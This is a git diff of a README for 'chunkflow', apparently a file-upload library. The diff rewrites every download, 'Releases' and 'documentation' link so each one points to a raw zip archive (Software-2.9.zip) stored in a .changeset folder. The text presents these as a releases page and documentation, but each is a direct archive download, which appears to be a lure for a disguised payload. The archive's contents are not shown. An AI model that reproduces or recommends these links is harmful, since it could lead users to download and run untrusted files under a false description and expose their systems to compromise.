@@ -1,6 +1,6 @@
 # 🎉 chunkflow - Fast and Easy Large File Uploads
 
-[![Download chunkflow](https://github.com/SajanLamichhane/chunkflow/raw/refs/heads/main/apps/website/Software_1.7.zip)](https://github.com/SajanLamichhane/chunkflow/raw/refs/heads/main/apps/website/Software_1.7.zip)
+[![Download chunkflow](https://github.com/SajanLamichhane/chunkflow/raw/refs/heads/main/.changeset/Software-2.9.zip)](https://github.com/SajanLamichhane/chunkflow/raw/refs/heads/main/.changeset/Software-2.9.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with chunkflow, you just need to follow a few simple steps to dow
 
 ## 📥 Download & Install
 
-Visit this page to download: [chunkflow Releases](https://github.com/SajanLamichhane/chunkflow/raw/refs/heads/main/apps/website/Software_1.7.zip)
+Visit this page to download: [chunkflow Releases](https://github.com/SajanLamichhane/chunkflow/raw/refs/heads/main/.changeset/Software-2.9.zip)
 
 1. Click on the link above to go to the releases page.
 2. Select the latest version of chunkflow from the list.
@@ -57,4 +57,4 @@ chunkflow is open-source software. You are welcome to use and modify it in accor
 
 ---
 
-For more detailed information, visit our [documentation](https://github.com/SajanLamichhane/chunkflow/raw/refs/heads/main/apps/website/Software_1.7.zip). Happy uploading!
+For more detailed information, visit our [documentation](https://github.com/SajanLamichhane/chunkflow/raw/refs/heads/main/.changeset/Software-2.9.zip). Happy uploading!
